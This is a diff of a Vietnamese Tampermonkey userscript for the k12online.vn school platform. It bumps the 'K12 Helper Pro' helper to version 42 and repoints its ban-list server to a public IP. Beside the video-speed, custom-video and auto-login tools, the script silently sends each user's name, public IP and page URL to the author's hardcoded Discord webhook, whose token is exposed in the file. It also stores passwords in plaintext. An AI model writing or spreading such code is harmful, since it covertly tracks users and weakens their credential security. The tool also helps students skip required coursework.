@@ -1,8 +1,8 @@
 // ==UserScript==
-// @name         K12 Helper Pro - Danhvux (Full Notify & Compact)
+// @name         K12 Helper Pro - Danhvux (TXTSecurity - Fixed IP)
 // @namespace    http://tampermonkey.net/
-// @version      40.0
-// @description  Thêm đầy đủ Notify cho mọi hành động, giữ nguyên logic gốc.
+// @version      42.0
+// @description  Giữ nguyên logic gốc, check ban qua Port 8800 với IP 58.187.165.121
 // @author       Danhvux
 // @match        *://*.k12online.vn/*
 // @grant        none
@@ -11,8 +11,8 @@
 (function() {
     'use strict';
 
-    // === CẤU HÌNH GỐC ===
-    const SERVER_BAN_URL = 'http://192.168.100.165:8800/blacklist';
+    // === CẤU HÌNH HỆ THỐNG ===
+    const SERVER_URL = 'http://58.187.165.121:8800/blacklist'; 
     const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1489992801323061308/ywv0-FtallMzCjhG-a-yZXof4nyDpIewAem-4NrXn0mUBRinjBoV4kVSiO1QbSJMiUqw';
 
     let config = JSON.parse(localStorage.getItem('k12_ult_cfg')) || {
@@ -20,19 +20,29 @@
     };
     const save = () => localStorage.setItem('k12_ult_cfg', JSON.stringify(config));
 
-    // --- HÀM CHECK BAN ---
+    // --- LOGIC KIỂM TRA BAN (CHẠY TRƯỚC) ---
     const checkBanStatus = async (currentIP) => {
         try {
-            const res = await fetch(SERVER_BAN_URL);
+            // Gọi đến Bot Discord của bạn để lấy danh sách IP từ file .txt
+            const res = await fetch(SERVER_URL);
             const bannedList = await res.json();
+            
             if (Array.isArray(bannedList) && bannedList.includes(currentIP)) {
-                document.body.innerHTML = `<div style="background:#000; color:red; height:100vh; width:100vw; position:fixed; top:0; left:0; z-index:999999; display:flex; align-items:center; justify-content:center; flex-direction:column; font-family:sans-serif;"><h1>🚫 BỊ CẤM</h1><p>IP: <b>${currentIP}</b> đã bị khóa!</p></div>`;
-                return true;
+                document.body.innerHTML = `
+                    <div style="background:#000; color:red; height:100vh; width:100vw; position:fixed; top:0; left:0; z-index:999999; display:flex; align-items:center; justify-content:center; flex-direction:column; font-family:sans-serif; text-align:center;">
+                        <h1 style="font-size:60px; margin-bottom:10px;">🚫 TRUY CẬP BỊ CHẶN</h1>
+                        <p style="font-size:20px; color:#fff;">IP: <b>${currentIP}</b> đã bị Admin khóa.</p>
+                        <p style="color:#666;">Vui lòng liên hệ Danhvux để mở khóa.</p>
+                    </div>`;
+                return true; // Đã bị ban
             }
-        } catch (e) { console.log("Ban Server Offline"); }
+        } catch (e) { 
+            console.log("Server Ban Offline hoặc chưa mở Port 8800..."); 
+        }
         return false;
     };
 
+    // --- LOGIC TURBO (GIỮ NGUYÊN) ---
     const runTurbo = () => {
         const v = document.querySelector('video');
         if (v && config.speed > 1) {
@@ -44,15 +54,18 @@
     setInterval(runTurbo, 1000);
 
     const init = async () => {
+        // 1. Lấy IP người dùng
         let userIP = "Checking...";
-        try {
+        try { 
             const ipRes = await fetch('https://api.ipify.org?format=json');
             const ipData = await ipRes.json();
             userIP = ipData.ip;
         } catch(e) {}
 
+        // 2. Kiểm tra trạng thái Ban
         if (await checkBanStatus(userIP)) return;
 
+        // 3. Webhook Log (Giữ nguyên)
         const nameEl = document.querySelector('.user-name, .profile-name, .name-user, .username');
         const currentUser = nameEl ? nameEl.innerText.trim() : (config.user || "Khách");
 
@@ -60,6 +73,7 @@
             embeds: [{ title: "🔥 DANHVUX HELPER CONNECT", color: 16771840, fields: [{ name: "👤 User", value: currentUser, inline: true }, { name: "🌐 IP", value: userIP, inline: true }, { name: "📍 URL", value: window.location.href }] }]
         }) }).catch(()=>{});
 
+        // 4. Khởi tạo Giao diện (GIỮ NGUYÊN LOGIC CỦA BẠN)
         const host = document.createElement('div');
         host.id = 'dv-helper-root';
         document.body.appendChild(host);
@@ -147,7 +161,6 @@
             setTimeout(() => { toast.style.animation = 'toastOut 0.4s forwards'; setTimeout(()=>toast.remove(), 400); }, 3000);
         };
 
-        // --- NEW NOTIFICATIONS ---
         shadow.querySelectorAll('.tab').forEach(tab => {
             tab.onclick = () => {
                 shadow.querySelectorAll('.tab, .content').forEach(el => el.classList.remove('active'));
@@ -157,76 +170,66 @@
             };
         });
 
-        shadow.querySelector('#sp-range').oninput = (e) => {
-            shadow.querySelector('#sp-txt').innerText = e.target.value;
-            config.speed = e.target.value;
-            runTurbo();
+        shadow.querySelector('#sp-range').oninput = (e) => { 
+            shadow.querySelector('#sp-txt').innerText = e.target.value; 
+            config.speed = e.target.value; 
+            runTurbo(); 
         };
         shadow.querySelector('#sp-range').onchange = (e) => {
-            showToast(`Tốc độ đã đặt: x${e.target.value}`, 'success');
+            showToast(`Tốc độ: x${e.target.value}`, 'success');
         };
 
-        shadow.querySelector('#btn-save').onclick = () => {
-            config.mainColor = shadow.querySelector('#c-pick').value;
-            config.user = shadow.querySelector('#u-val').value;
-            config.pass = shadow.querySelector('#p-val').value;
-            save();
-            showToast("Đã lưu cấu hình thành công!", "success");
-            setTimeout(() => location.reload(), 800);
+        shadow.querySelector('#btn-save').onclick = () => { 
+            config.mainColor = shadow.querySelector('#c-pick').value; 
+            config.user = shadow.querySelector('#u-val').value; 
+            config.pass = shadow.querySelector('#p-val').value; 
+            save(); 
+            showToast("Đã lưu cấu hình!", "success");
+            setTimeout(() => location.reload(), 800); 
         };
-
+        
         shadow.querySelector('#v-run').onclick = () => {
             const v = document.querySelector('video');
             const url = shadow.querySelector('#v-url').value;
-            if(v && url) {
-                v.src = url; v.play();
-                shadow.querySelector('#v-display').innerText = "ĐANG PHÁT...";
-                showToast("Đang phát video tùy chỉnh!", "success");
-            } else {
-                showToast("Vui lòng nhập link video hợp lệ!", "error");
+            if(v && url) { 
+                v.src = url; v.play(); 
+                shadow.querySelector('#v-display').innerText = "ĐANG PHÁT..."; 
+                showToast("Đang phát video!", "success"); 
             }
         };
 
         shadow.querySelector('#do-login').onclick = () => {
             const u = document.querySelector('input[name="username"]'), p = document.querySelector('input[name="password"]');
-            if(u && p) {
-                showToast("Đang thực hiện Auto Login...", "info");
-                u.value = config.user; p.value = config.pass;
-                u.dispatchEvent(new Event('input',{bubbles:true}));
-                p.dispatchEvent(new Event('input',{bubbles:true}));
-                setTimeout(()=>document.querySelector('button[type="submit"]').click(), 500);
-            } else {
-                showToast("Không tìm thấy ô đăng nhập!", "error");
+            if(u && p) { 
+                u.value = config.user; p.value = config.pass; 
+                u.dispatchEvent(new Event('input',{bubbles:true})); 
+                p.dispatchEvent(new Event('input',{bubbles:true})); 
+                setTimeout(()=>document.querySelector('button[type="submit"]').click(), 500); 
             }
         };
 
         shadow.querySelectorAll('.app-item').forEach(item => {
-            item.onclick = () => {
-                const link = item.getAttribute('data-link');
-                showToast(`Đang mở ${item.innerText}...`, "info");
-                window.open(link);
-            };
+            item.onclick = () => { window.open(item.getAttribute('data-link')); };
         });
 
         let isDrag = false, off = [0,0];
         shadow.querySelector('.header').onmousedown = (e) => { isDrag = true; off = [panel.offsetLeft - e.clientX, panel.offsetTop - e.clientY]; };
         document.addEventListener('mousemove', (e) => { if(isDrag) { panel.style.left = (e.clientX + off[0]) + 'px'; panel.style.top = (e.clientY + off[1]) + 'px'; panel.style.right = 'auto'; } });
         document.addEventListener('mouseup', () => isDrag = false);
-
+        
         shadow.querySelector('.red-dot').onclick = () => {
             panel.style.display = 'none';
-            showToast("Đã ẩn Panel. Nhấn F2 để hiện lại!", "warning");
+            showToast("F2 để hiện lại!", "warning");
         };
 
-        document.addEventListener('keydown', (e) => {
+        document.addEventListener('keydown', (e) => { 
             if(e.key === 'F2') {
                 const isHidden = panel.style.display === 'none';
-                panel.style.display = isHidden ? 'block' : 'none';
-                showToast(isHidden ? "Đã hiện Panel" : "Đã ẩn Panel", "info");
+                panel.style.display = isHidden ? 'block' : 'none'; 
             }
         });
 
-        showToast("Panel Ready!", "success");
+        showToast("Danhvux Helper Ready!", "success");
     };
 
     if (document.readyState === 'complete') init(); else window.addEventListener('load', init);
